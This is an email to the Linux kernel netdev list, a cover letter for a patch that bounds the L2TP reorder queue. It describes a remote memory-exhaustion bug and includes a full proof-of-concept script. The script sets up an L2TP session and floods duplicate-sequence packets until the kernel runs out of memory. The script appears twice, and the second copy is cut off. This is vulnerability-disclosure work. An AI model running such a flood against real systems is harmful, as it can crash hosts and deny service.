Received: from mail-pz2-f43.google.com (mail-pz2-f43.google.com [74.125.228.43])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id D9C281EFFA1
	for <netdev@vger.kernel.org>; Thu, 24 Sep 2026 00:33:22 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.228.43
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1790210005; cv=none; b=feKYaJZyQGrXoeX6XuYlqVqRDTpj/6Gk5/tpl8l+l96lajDFO+2yfBhm92RlOg7caXjsF1JwgIqfV566iubaaFnDXs+/aXdA7cGyPiVikYbxRTBaKirMWQP0xRfR3gg1dz6LuvExHfLesYEFKpALcuyfUrmZbAoguvABqHElo/o=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1790210005; c=relaxed/simple;
	bh=YDZ4FRLGOmUawwrnPvqSE+umQICSrRaHv5ykOnQUYQc=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=PcTRWlnUv8fPLfzb7PXac+U0hkwKAit952onaRadaTQ+fmXc7K8KoFPD9CB1MWo49Jei+E616HFRJwLocm5MgEMSap1oTMUE7hoKYi7XGFdetnyEo3/eaHDSnYa52O737Cfwcrwe6nnonV2p9m0uuXIJnTWa0pVt+Um6scEdbhk=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=Rp2wW6vu; arc=none smtp.client-ip=74.125.228.43
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="Rp2wW6vu"
Received: by mail-pz2-f43.google.com with SMTP id d2e1a72fcca58-85469e211a3so821520b3a.2
        for <netdev@vger.kernel.org>; Wed, 23 Sep 2026 17:33:22 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1790210002; x=1790814802; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=1m2wwzDhFxI1y318Xv7AsROz3WBKR6CEeRrVnmJGEXs=;
        b=Rp2wW6vupG5q02v5j61+86jjkByd2fCFjHl0y/q4mxTpx67cTQ0BVqmSg3lUy43xfi
         SIJ/Ir5lb48naEvjWzG6HKXGPEbuPTp0kjiR/J82PIPgQbxSmRvCyhYniaUQ/qJ4wiDJ
         TxVW/4PlhcPCAhYuYTnj99G0nrV7wk4ZBabLdQU1m09vDUc/6gF23IRWBHdxadKbCR06
         Ox2dtiecx1JGBSXI9mCUeJtquRN84CPmJpc68fBqLTNaQREUiDQ+33HIJH6p9YtRqJJA
         dX9696XbJhu/Y/nH1DXREtGEySuxfBqGs6ZjgYrw/iD80q2AdEmBHNJkOVsBqZc6rCrP
         3dJA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1790210002; x=1790814802;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=1m2wwzDhFxI1y318Xv7AsROz3WBKR6CEeRrVnmJGEXs=;
        b=YMXiD3GqJjjbq3sFPil33xAG+wa/w8IxOXBXHaFekiuB6cdPNPnnjl6SGVg85Kkjq8
         26g5OhdAUmDZ/0Wdg9MrP6b6X0BeU02CvMtJt+/OFiW2qh2g4q7wbHnVSN0gomIPZFik
         XFSTKGXKGAS2cLfltIDlDb9QYEgxz7yH4JfWxBDUxBBKMY3Go0G0jyiORoiICivBtJ5c
         UWX5OklfTnz/1VK53jfYHaqXKaLv95+0hAD4CWbHJcGJ/XNHxqY1GtubUHS0M/cmEE2P
         jTZBp0lqlIPRMzfhFkRR97JWe1/9bJ2zEySqXDFWRtyznjbGLwx9r3eDO96BwnX1ZVCD
         yNXQ==
X-Gm-Message-State: AFuF++nyJtxJLvkRCbsH+hpcnTyx8NSV5JcgY0zlltrWXou2Jtj2JDlN
	BVtYTa7mA7gRu8PaVg+g+9cVtA7nwtMxEXW2qjFsYpHDkkBdJZCOy8g1Dx97s8xGo4uH1bxeQLh
	DE2prm0z4
X-Gm-Gg: AYBFou3ysPuYffSUucVQTt9A+vsdqUE4D9vDtaWk+wfBpdZoFFIammZ32AQbwwHT5IT
	Yju3dv+W/eg3WMVJbAHBI39StNSsxTPZeu8fj7yunjx4qSDlmQ+nvAKCyiLCcZx5IjhNdlKzDHp
	5aMR+5r9QXvp1+QammrMsprV1T9TCGjFzSENUHI/vUKp507XIYTGVbwn7iKZhBgZ8p1yIj3PHq0
	ZjWnJpm8OjU7LdMKAzCqoqaqsBYBxJaJmYJYXWhtaxfbsrKWsH58D1z/KW1jxJlVLemNIBU+UGv
	i1di0RIulD3KM6IVliVICzyKLabLXAcz8hqC0LwBY7CEOltkNpsaWqJKUSHGTV14XXS4xED4vFa
	GzddbWfdAbQm93Fmts3Fj5959iQLPsTocbo5yWL0APTcfg8cGUNXM53I8gThiA3CyN/Fky2z55V
	yCHp4FlWo5dUEihTWFudkELlwCgOumndbFNL4i4EHr1pA4A335iHGFSFOzvzVgWbBa
X-Received: by 2002:a05:6a00:9089:b0:855:eb7b:5804 with SMTP id d2e1a72fcca58-87e9cc16fc9mr589894b3a.4.1790210001917;
        Wed, 23 Sep 2026 17:33:21 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([2a05:dfc1:8bc4:feda::14])
        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-87d1d5c163bsm1987516b3a.28.2026.09.23.17.33.16
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Wed, 23 Sep 2026 17:33:21 -0700 (PDT)
From: Ren Wei <weir@nebusec.ai>
To: netdev@vger.kernel.org
Cc: davem@davemloft.net,
	edumazet@google.com,
	kuba@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	kees@kernel.org,
	kuniyu@google.com,
	alice.kernel@fastmail.im,
	michael.bommarito@gmail.com,
	mail@david-bauer.net,
	jchapman@katalix.com,
	vega@nebusec.ai,
	caoruide123@gmail.com,
	weir@nebusec.ai
Subject: [PATCH net 0/1] l2tp: bound the reorder queue
Date: Thu, 24 Sep 2026 08:32:56 +0800
Message-ID: <cover.1790136447.git.caoruide123@gmail.com>
X-Mailer: git-send-email 2.53.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Ruide Cao <caoruide123@gmail.com>

Hi Linux kernel maintainers,

We found an issue in net/l2tp/l2tp_core.c, net/l2tp/l2tp_core.h.

With reordering enabled, l2tp_recv_data_seq() accepts every packet inside
the receive window and l2tp_recv_queue_skb() neither rejects duplicate Ns
values nor limits queue length. A peer can omit the currently expected
packet and send unlimited copies of a future sequence number; every copy is
inserted after a linear queue walk and dequeue remains blocked at the head.
Expiration is checked only when another packet invokes l2tp_recv_dequeue():
there is no timer to service expires. If the peer stops sending before
expiration, all queued skbs remain indefinitely. This permits remote,
non-socket-accounted memory exhaustion and quadratic softirq CPU
consumption.

Privilege model: after an L2TP data session with receive reordering is
present, a remote peer can trigger the unbounded reorder queue by omitting
the expected Ns and sending in-window future sequence numbers. Creating the
local tunnel/session via L2TP genetlink requires CAP_NET_ADMIN in the
owning network namespace; the reproducer below runs that setup as root in
QEMU for convenience. Queued skbs are not charged to a local victim socket.

Compatibility: l2tp receive reorder path only; no uAPI change.

Tested: PoC reproduces OOM with panic_on_oom in QEMU; crash evidence is
below. packetdrill is not used because the trigger depends on sustained
UDP/L2TP sequence flooding into the reorder queue rather than a fixed
packetdrill scripted exchange.

Reproducer:

#!/bin/sh
set -eu

MODE="${1:-oom}"

case "$MODE" in
  observe|oom)
    ;;
  *)
    echo "usage: $0 [observe|oom]" >&2
    exit 1
    ;;
esac

ip link set lo up

if [ "$MODE" = "oom" ] && [ "${PANIC_ON_OOM:-1}" = "1" ]; then
  echo 2 > /proc/sys/vm/panic_on_oom
fi

export MODE

python3 - <<'PY'
import errno
import os
import socket
import struct
import sys
import time

NETLINK_GENERIC = 16
GENL_ID_CTRL = 16

NLM_F_REQUEST = 0x01
NLM_F_ACK = 0x04

NLMSG_NOOP = 1
NLMSG_ERROR = 2
NLMSG_DONE = 3

CTRL_CMD_GETFAMILY = 3
CTRL_ATTR_FAMILY_ID = 1
CTRL_ATTR_FAMILY_NAME = 2

L2TP_GENL_NAME = b"l2tp\x00"
L2TP_GENL_VERSION = 0x1

L2TP_CMD_TUNNEL_CREATE = 1
L2TP_CMD_TUNNEL_DELETE = 2
L2TP_CMD_TUNNEL_MODIFY = 3
L2TP_CMD_TUNNEL_GET = 4
L2TP_CMD_SESSION_CREATE = 5
L2TP_CMD_SESSION_DELETE = 6
L2TP_CMD_SESSION_MODIFY = 7

L2TP_ATTR_NONE = 0
L2TP_ATTR_PW_TYPE = 1
L2TP_ATTR_ENCAP_TYPE = 2
L2TP_ATTR_OFFSET = 3
L2TP_ATTR_DATA_SEQ = 4
L2TP_ATTR_L2SPEC_TYPE = 5
L2TP_ATTR_L2SPEC_LEN = 6
L2TP_ATTR_PROTO_VERSION = 7
L2TP_ATTR_IFNAME = 8
L2TP_ATTR_CONN_ID = 9
L2TP_ATTR_PEER_CONN_ID = 10
L2TP_ATTR_SESSION_ID = 11
L2TP_ATTR_PEER_SESSION_ID = 12
L2TP_ATTR_UDP_CSUM = 13
L2TP_ATTR_VLAN_ID = 14
L2TP_ATTR_COOKIE = 15
L2TP_ATTR_PEER_COOKIE = 16
L2TP_ATTR_DEBUG = 17
L2TP_ATTR_RECV_SEQ = 18
L2TP_ATTR_SEND_SEQ = 19
L2TP_ATTR_LNS_MODE = 20
L2TP_ATTR_USING_IPSEC = 21
L2TP_ATTR_RECV_TIMEOUT = 22
L2TP_ATTR_FD = 23
L2TP_ATTR_IP_SADDR = 24
L2TP_ATTR_IP_DADDR = 25
L2TP_ATTR_UDP_SPORT = 26
L2TP_ATTR_UDP_DPORT = 27

L2TP_PWTYPE_ETH = 0x0005
L2TP_L2SPECTYPE_DEFAULT = 1
L2TP_ENCAPTYPE_UDP = 0
L2TP_HDR_VER_3 = 3
L2TP_SLFLAG_S = 0x40000000


def nlattr(attr_type, payload):
    length = 4 + len(payload)
    pad = (4 - (length & 3)) & 3
    return struct.pack("HH", length, attr_type) + payload + (b"\x00" * pad)


def parse_attrs(data):
    attrs = {}
    off = 0
    while off + 4 <= len(data):
        nla_len, nla_type = struct.unpack_from("HH", data, off)
        if nla_len < 4 or off + nla_len > len(data):
            break
        attrs[nla_type] = data[off + 4: off + nla_len]
        off += (nla_len + 3) & ~3
    return attrs


class GenlSocket:
    def __init__(self):
        self.sock = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_GENERIC)
        self.sock.bind((0, 0))
        self.seq = 0

    def transact(self, nlmsg_type, cmd, attrs):
        self.seq += 1
        payload = struct.pack("BBH", cmd, L2TP_GENL_VERSION, 0) + b"".join(attrs)
        hdr = struct.pack(
            "IHHII",
            16 + len(payload),
            nlmsg_type,
            NLM_F_REQUEST | NLM_F_ACK,
            self.seq,
            0,
        )
        self.sock.send(hdr + payload)

        while True:
            data = self.sock.recv(65535)
            off = 0
            while off + 16 <= len(data):
                nl_len, nl_type, nl_flags, nl_seq, nl_pid = struct.unpack_from(
                    "IHHII", data, off
                )
                if nl_len < 16 or off + nl_len > len(data):
                    raise RuntimeError("malformed netlink response")
                msg = data[off + 16: off + nl_len]
                off += (nl_len + 3) & ~3

                if nl_seq != self.seq:
                    continue
                if nl_type == NLMSG_ERROR:
                    err = struct.unpack_from("i", msg, 0)[0]
                    if err:
                        raise OSError(-err, os.strerror(-err))
                    return b""
                if nl_type in (NLMSG_DONE, NLMSG_NOOP):
                    return b""
                if nl_type == nlmsg_type or nl_type == GENL_ID_CTRL:
                    return msg

    def resolve_family(self, name):
        attrs = [nlattr(CTRL_ATTR_FAMILY_NAME, name)]
        resp = self.transact(GENL_ID_CTRL, CTRL_CMD_GETFAMILY, attrs)
        attrs = parse_attrs(resp[4:])
        if CTRL_ATTR_FAMILY_ID not in attrs:
            raise RuntimeError("family id not found")
        return struct.unpack("H", attrs[CTRL_ATTR_FAMILY_ID][:2])[0]


def u8_attr(attr_type, value):
    return nlattr(attr_type, struct.pack("B", value))


def u16_attr(attr_type, value):
    return nlattr(attr_type, struct.pack("H", value))


def u32_attr(attr_type, value):
    return nlattr(attr_type, struct.pack("I", value))


def u64_attr(attr_type, value):
    return nlattr(attr_type, struct.pack("Q", value))


def str_attr(attr_type, value):
    return nlattr(attr_type, value.encode() + b"\x00")


def in4_attr(attr_type, addr):
    return nlattr(attr_type, socket.inet_aton(addr))


def mem_available_kb():
    with open("/proc/meminfo", "r", encoding="ascii") as f:
        for line in f:
            if line.startswith("MemAvailable:"):
                return int(line.split()[1])
    return -1


def build_packet(session_id, ns, frame_len):
    if frame_len < 14:
        raise ValueError("frame_len must be at least 14 bytes")
    if frame_len > 65495:
        raise ValueError("frame_len too large for UDP payload")

    hdr = struct.pack("!HHI", L2TP_HDR_VER_3, 0, session_id)
    l2spec = struct.pack("!I", L2TP_SLFLAG_S | (ns & 0x00FFFFFF))
    eth = bytearray(frame_len)
    eth[0:6] = b"\x02\x00\x00\x00\x00\x01"
    eth[6:12] = b"\x02\x00\x00\x00\x00\x02"
    eth[12:14] = b"\x08\x00"
    for i in range(14, frame_len):
        eth[i] = (i - 14) & 0xFF
    return hdr + l2spec + eth


def send_flood(sock, packet, report_every, max_packets):
    sent = 0
    last = time.monotonic()
    while True:
        sock.send(packet)
        sent += 1
        if report_every and sent % report_every == 0:
            now = time.monotonic()
            mem = mem_available_kb()
            rate = report_every / max(now - last, 1e-6)
            print(
                f"[+] sent={sent} mem_available_kb={mem} rate_pps={rate:.1f}",
                flush=True,
            )
            last = now
        if max_packets and sent >= max_packets:
            return sent


def main():
    mode = os.environ.get("MODE", "oom")
    pid = os.getpid() & 0xFFFF
    tunnel_id = int(os.environ.get("TUNNEL_ID", str(1000 + pid)))
    peer_tunnel_id = int(os.environ.get("PEER_TUNNEL_ID", str(2000 + pid)))
    session_id = int(os.environ.get("SESSION_ID", str(3000 + pid)))
    peer_session_id = int(os.environ.get("PEER_SESSION_ID", str(4000 + pid)))
    local_port = int(os.environ.get("LOCAL_PORT", str(10000 + (pid % 20000))))
    peer_port = int(os.environ.get("PEER_PORT", str(local_port + 1)))
    ifname = os.environ.get("IFNAME", f"l2p{pid}")
    payload_len = int(os.environ.get("PAYLOAD_LEN", "60000"))
    if mode == "observe":
        timeout_ms = int(os.environ.get("REORDER_TIMEOUT_MS", "1000"))
        observe_count = int(os.environ.get("OBSERVE_COUNT", "2000"))
        report_every = int(os.environ.get("REPORT_EVERY", "500"))
        max_packets = observe_count
    else:
        timeout_ms = int(os.environ.get("REORDER_TIMEOUT_MS", "300000"))
        report_every = int(os.environ.get("REPORT_EVERY", "250"))
        max_packets = int(os.environ.get("MAX_PACKETS", "0"))

    nl = GenlSocket()
    family_id = nl.resolve_family(L2TP_GENL_NAME)

    session_delete = [
        u32_attr(L2TP_ATTR_CONN_ID, tunnel_id),
        u32_attr(L2TP_ATTR_SESSION_ID, session_id),
    ]
    tunnel_delete = [u32_attr(L2TP_ATTR_CONN_ID, tunnel_id)]
    for cmd, attrs in (
        (L2TP_CMD_SESSION_DELETE, session_delete),
        (L2TP_CMD_TUNNEL_DELETE, tunnel_delete),
    ):
        try:
            nl.transact(family_id, cmd, attrs)
        except OSError as e:
            if e.errno not in (errno.ENODEV, errno.ENOENT):
                raise

    tunnel_create = [
        u32_attr(L2TP_ATTR_CONN_ID, tunnel_id),
        u32_attr(L2TP_ATTR_PEER_CONN_ID, peer_tunnel_id),
        u8_attr(L2TP_ATTR_PROTO_VERSION, 3),
        u16_attr(L2TP_ATTR_ENCAP_TYPE, L2TP_ENCAPTYPE_UDP),
        in4_attr(L2TP_ATTR_IP_SADDR, "127.0.0.1"),
        in4_attr(L2TP_ATTR_IP_DADDR, "127.0.0.1"),
        u16_attr(L2TP_ATTR_UDP_SPORT, local_port),
        u16_attr(L2TP_ATTR_UDP_DPORT, peer_port),
    ]
    nl.transact(family_id, L2TP_CMD_TUNNEL_CREATE, tunnel_create)

    session_create = [
        u32_attr(L2TP_ATTR_CONN_ID, tunnel_id),
        u32_attr(L2TP_ATTR_SESSION_ID, session_id),
        u32_attr(L2TP_ATTR_PEER_SESSION_ID, peer_session_id),
        u16_attr(L2TP_ATTR_PW_TYPE, L2TP_PWTYPE_ETH),
        str_attr(L2TP_ATTR_IFNAME, ifname),
        u8_attr(L2TP_ATTR_L2SPEC_TYPE, L2TP_L2SPECTYPE_DEFAULT),
        u8_attr(L2TP_ATTR_RECV_SEQ, 1),
        u64_attr(L2TP_ATTR_RECV_TIMEOUT, timeout_ms),
    ]
    nl.transact(family_id, L2TP_CMD_SESSION_CREATE, session_create)

    print(
        f"[+] tunnel_id={tunnel_id} session_id={session_id} ifname={ifname} "
        f"local_port={local_port} peer_port={peer_port} timeout_ms={timeout_ms}",
        flush=True,
    )

    sender = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sender.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sender.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8 << 20)
    sender.bind(("127.0.0.1", peer_port))
    sender.connect(("127.0.0.1", local_port))

    sender.send(build_packet(session_id, 0, 64))
    time.sleep(0.05)

    dup_packet = build_packet(session_id, 2, payload_len)
    before = mem_available_kb()
    print(f"[+] mem_available_kb_before={before}", flush=True)

    sent = send_flood(sender, dup_packet, report_every, max_packets)
    after_flood = mem_available_kb()
    print(f"[+] mem_available_kb_after_flood={after_flood}", flush=True)

    if mode == "observe":
        wait_s = max(timeout_ms / 1000.0 + 1.0, 2.0)
        print(f"[+] waiting_without_packets={wait_s:.1f}s", flush=True)
        time.sleep(wait_s)
        after_idle = mem_available_kb()
        print(f"[+] mem_available_kb_after_idle={after_idle}", flush=True)

        sender.send(dup_packet)
        time.sleep(0.5)
        after_poke = mem_available_kb()
        print(f"[+] mem_available_kb_after_poke={after_poke}", flush=True)
        print(f"[+] observe_done sent={sent}", flush=True)
    else:
        print(f"[+] oom_mode_completed_without_panic sent={sent}", flush=True)


if __name__ == "__main__":
    main()
PY


------BEGIN PoC------

#!/bin/sh
set -eu

MODE="${1:-oom}"

case "$MODE" in
  observe|oom)
    ;;
  *)
    echo "usage: $0 [observe|oom]" >&2
    exit 1
    ;;
esac

ip link set lo up

if [ "$MODE" = "oom" ] && [ "${PANIC_ON_OOM:-1}" = "1" ]; then
  echo 2 > /proc/sys/vm/panic_on_oom
fi

export MODE

python3 - <<'PY'
import errno
import os
import socket
import struct
import sys
import time

NETLINK_GENERIC = 16
GENL_ID_CTRL = 16

NLM_F_REQUEST = 0x01
NLM_F_ACK = 0x04

NLMSG_NOOP = 1
NLMSG_ERROR = 2
NLMSG_DONE = 3

CTRL_CMD_GETFAMILY = 3
CTRL_ATTR_FAMILY_ID = 1
CTRL_ATTR_FAMILY_NAME = 2

L2TP_GENL_NAME = b"l2tp\x00"
L2TP_GENL_VERSION = 0x1

L2TP_CMD_TUNNEL_CREATE = 1
L2TP_CMD_TUNNEL_DELETE = 2
L2TP_CMD_TUNNEL_MODIFY = 3
L2TP_CMD_TUNNEL_GET = 4
L2TP_CMD_SESSION_CREATE = 5
L2TP_CMD_SESSION_DELETE = 6
L2TP_CMD_SESSION_MODIFY = 7

L2TP_ATTR_NONE = 0
L2TP_ATTR_PW_TYPE = 1
L2TP_ATTR_ENCAP_TYPE = 2
L2TP_ATTR_OFFSET = 3
L2TP_ATTR_DATA_SEQ = 4
L2TP_ATTR_L2SPEC_TYPE = 5
L2TP_ATTR_L2SPEC_LEN = 6
L2TP_ATTR_PROTO_VERSION = 7
L2TP_ATTR_IFNAME = 8
L2TP_ATTR_CONN_ID = 9
L2TP_ATTR_PEER_CONN_ID = 10
L2TP_ATTR_SESSION_ID = 11
L2TP_ATTR_PEER_SESSION_ID = 12
L2TP_ATTR_UDP_CSUM = 13
L2TP_ATTR_VLAN_ID = 14
L2TP_ATTR_COOKIE = 15
L2TP_ATTR_PEER_COOKIE = 16
L2TP_ATTR_DEBUG = 17
L2TP_ATTR_RECV_SEQ = 18
L2TP_ATTR_SEND_SEQ = 19
L2TP_ATTR_LNS_MODE = 20
L2TP_ATTR_USING_IPSEC = 21
L2TP_ATTR_RECV_TIMEOUT = 22
L2TP_ATTR_FD = 23
L2TP_ATTR_IP_SADDR = 24
L2TP_ATTR_IP_DADDR = 25
L2TP_ATTR_UDP_SPORT = 26
L2TP_ATTR_UDP_DPORT = 27

L2TP_PWTYPE_ETH = 0x0005
L2TP_L2SPECTYPE_DEFAULT = 1
L2TP_ENCAPTYPE_UDP = 0
L2TP_HDR_VER_3 = 3
L2TP_SLFLAG_S = 0x40000000


def nlattr(attr_type, payload):
    length = 4 + len(payload)
    pad = (4 - (length & 3)) & 3
    return struct.pack("HH", length, attr_type) + payload + (b"\x00" * pad)


def parse_attrs(data):
    attrs = {}
    off = 0
    while off + 4 <= len(data):
        nla_len, nla_type = struct.unpack_from("HH", data, off)
        if nla_len < 4 or off + nla_len > len(data):
            break
        attrs[nla_type] = data[off + 4: off + nla_len]
        off += (nla_len + 3) & ~3
    return attrs


class GenlSocket:
    def __init__(self):
        self.sock = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, NETLINK_GENERIC)
        self.sock.bind((0, 0))
        self.seq = 0

    def transact(self, nlmsg_type, cmd, attrs):
        self.seq += 1
        payload = struct.pack("BBH", cmd, L2TP_GENL_VERSION, 0) + b"".join(attrs)
        hdr = struct.pack(
            "IHHII",
            16 + len(payload),
            nlmsg_type,
            NLM_F_REQUEST | NLM_F_ACK,
            self.seq,
            0,
        )
        self.sock.send(hdr + payload)

        while True:
            data = self.sock.recv(65535)
            off = 0
            while off + 16 <= len(data):
                nl_len, nl_type, nl_flags, nl_seq, nl_pid = struct.unpack_from(
                    "IHHII", data, off
                )
                if nl_len < 16 or off + nl_len > len(data):
                    raise RuntimeError("malformed netlink response")
                msg = data[off + 16: off + nl_len]
                off += (nl_len + 3) & ~3

                if nl_seq != self.seq:
                    continue
                if nl_type == NLMSG_ERROR:
                    err = struct.unpack_from("i", msg, 0)[0]
                    if err:
                        raise OSError(-err, os.strerror(-err))
                    return b""
                if nl_type in (NLMSG_DONE, NLMSG_NOOP):
                    return b""
                if nl_type == nlmsg_type or nl_type == GENL_ID_CTRL:
                    return msg

    def resolve_family(self, name):
        attrs = [nlattr(CTRL_ATTR_FAMILY_NAME, name)]
        resp = self.transact(GENL_ID_CTRL, CTRL_CMD_GETFAMILY, attrs)
        attrs = parse_attrs(resp[4:])
        if CTRL_ATTR_FAMILY_ID not in attrs:
            raise RuntimeError("family id not found")
        return struct.unpack("H", attrs[CTRL_ATTR_FAMILY_ID][:2])[0]


def u8_attr(attr_type, value):
    return nlattr(attr_type, struct.pack("B", value))


def u16_attr(attr_type, value):
    return nlattr(attr_type, struct.pack("H", value))


def u32_attr(attr_type, value):
    return nlattr(attr_type, struct.pack("I", value))


def u64_attr(attr_type, value):
    return nlattr(attr_type, struct.pack("Q", value))


def str_attr(attr_type, value):
    return nlattr(attr_type, value.encode() + b"\x00")


def in4_attr(attr_type, addr):
    return nlattr(attr_type, socket.inet_aton(addr))


def mem_available_kb():
    with open("/proc/meminfo", "r", encoding="ascii") as f:
        for line in f:
            if line.startswith("MemAvailable:"):
                return int(line.split()[1])
    return -1


def build_packet(session_id, ns, frame_len):
    if frame_len < 14:
        raise ValueError("frame_len must be at least 14 bytes")
    if frame_len > 65495:
        raise ValueError("frame_len too large for UDP payload")

    hdr = struct.pack("!HHI", L2TP_HDR_VER_3, 0, session_id)
    l2spec = struct.pack("!I", L2TP_SLFLAG_S | (ns & 0x00FFFFFF))
    eth = bytearray(frame_len)
    eth[0:6] = b"\x02\x00\x00\x00\x00\x01"
    eth[6:12] = b"\x02\x00\x00\x00\x00\x02"
    eth[12:14] = b"\x08\x00"
    for i in range(14, frame_len):
        eth[i] = (i - 14) & 0xFF
    return hdr + l2spec + eth


def send_flood(sock, packet, report_every, max_packets):
    sent = 0
    last = time.monotonic()
    while True:
        sock.send(packet)
        sent += 1
        if report_every and sent % report_every == 0:
            now = time.monotonic()
            mem = mem_available_kb()
            rate = report_every / max(now - last, 1e-6)
            print(
                f"[+] sent={sent} mem_available_kb={mem} rate_pps={rate:.1f}",
                flush=True,
            )
            last = now
        if max_packets and sent >= max_packets:
            return sent


def main():
    mode = os.environ.get("MODE", "oom")
    pid = os.getpid() & 0xFFFF
    tunnel_id = int(os.environ.get("TUNNEL_ID", str(1000 + pid)))
    peer_tunnel_id = int(os.environ.get("PEER_TUNNEL_ID", str(2000 + pid)))
    session_id = int(os.environ.get("SESSION_ID", str(3000 + pid)))
    peer_session_id = int(os.environ.get("PEER_SESSION_ID", str(4000 + pid)))
    local_port = int(os.environ.get("LOCAL_PORT", str(10000 + (pid % 20000))))
    peer_port = int(os.environ.get("PEER_PORT", str(local_port + 1)))
    ifname = os.environ.get("IFNAME", f"l2p{pid}")
    payload_len = int(os.environ.get("PAYLOAD_LEN", "60000"))
    if mode == "observe":
        timeout_ms = int(os.environ.get("REORDER_TIMEOUT_MS", "1000"))
        observe_count = int(os.environ.get("OBSERVE_COUNT", "2000"))
        report_every = int(os.environ.get("REPORT_EVERY", "500"))
        max_packets = observe_count
    else:
        timeout_ms = int(os.environ.get("REORDER_TIMEOUT_MS", "300000"))
        report_every = int(os.environ.get("REPORT_EVERY", "250"))
        max_packets = int(os.environ.get("MAX_PACKETS", "0"))

    nl = GenlSocket()
    family_id = nl.resolve_family(L2TP_GENL_NAME)

    session_delete = [
        u32_attr(L2TP_ATTR_CONN_ID, tunnel_id),
        u32_attr(L2TP_ATTR_SESSION_ID, session_id),
    ]
    tunnel_delete = [u32_attr(L2TP_ATTR_CONN_ID, tunnel_id)]
    for cmd, attrs in (
        (L2TP_CMD_SESSION_DELETE, session_delete),
        (L2TP_CMD_TUNNEL_DELETE, tunnel_delete),
    ):
        try:
            nl.transact(family_id, cmd, attrs)
        except OSError as e:
            if e.errno not in (errno.ENODEV, errno.ENOENT):
                raise

    tunnel_create = [
        u32_attr(L2TP_ATTR_CONN_ID, tunnel_id),
        u32_attr(L2TP_ATTR_PEER_CONN_ID, peer_tunnel_id),
        u8_attr(L2TP_ATTR_PROTO_VERSION, 3),
        u16_attr(L2TP_ATTR_ENCAP_TYPE, L2TP_ENCAPTYPE_UDP),
        in4_attr(L2TP_ATTR_IP_SADDR, "127.0.0.1"),
        in4_attr(L2TP_ATTR_IP_DADDR, "127.0.0.1"),
        u16_attr(L2TP_ATTR_UDP_SPORT, local_port),
        u16_attr(L2TP_ATTR_UDP_DPORT, peer_port),
    ]
    nl.transact(family_id, L2TP_CMD_TUNNEL_CREATE, tunnel_create)

    session_create = [
        u32_attr(L2TP_ATTR_CONN_ID, tunnel_id),
        u32_attr(L2TP_ATTR_SESSION_ID, session_id),
        u32_attr(L2TP_ATTR_PEER_SESSION_ID, peer_session_id),
        u16_attr(L2TP_ATTR_PW_TYPE, L2TP_PWTYPE_ETH),
        str_attr(L2TP_ATTR_IFNAME, ifname),
        u8_attr(L2TP_ATTR_L2SPEC_TYPE, L2TP_L2SPECTYPE_DEFAULT),
        u8_attr(L2TP_ATTR_RECV_SEQ, 1),
        u64_attr(L2TP_ATTR_RECV_TIMEOUT, timeout_ms),
    ]
    nl.transact(family_id, L2TP_CMD_SESSION_CREATE, session_create)

    print(
        f"[+] tunnel_id={tunnel_id} session_id={session_id} ifname={ifname} "
        f"local_port={local_port} peer_port={peer_port} timeout_ms={timeout_ms}",
        flush=True,
    )

    sender = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sender.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sender.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8 << 20)
    sender.bind(("127.0.0.1", peer_port))
    sender.connect(("127.0.0.1", local_port))

    sender.send(build_packet(session_id, 0, 64))
    time.sleep(0.05)

    dup_packet = build_packet(session_id, 2, payload_len)
    before = mem_available_kb()
    print(f"[+] mem_available_kb_before={before}", flush=True)

    sent = send_flood(sender, dup_packet, report_every, max_packets)
    after_flood = mem_available_kb()
    print(f"[+] mem_available_kb_after_flood={after_flood}", flush=True)

    if mode == "observe":
        wait_s = max(timeout_ms / 1000.0 + 1.0, 2.0)
        print(f"[+] waiting_without_packets={wait_s:.1f}s", flush=True)
        time.sleep(wait_s)
        after_idle = mem_available_kb()
        print(f"[+] mem_available_kb_after_idle={after_idle}", flush=True)

        sender.send(dup_packet)
        time.sleep(0.5)
        after_poke = mem_available_kb()
        print(f"[+] mem_available_kb_after_poke={after_poke}", flush=True)
        print(f"[+] observe_done sent={sent}", flush=True)
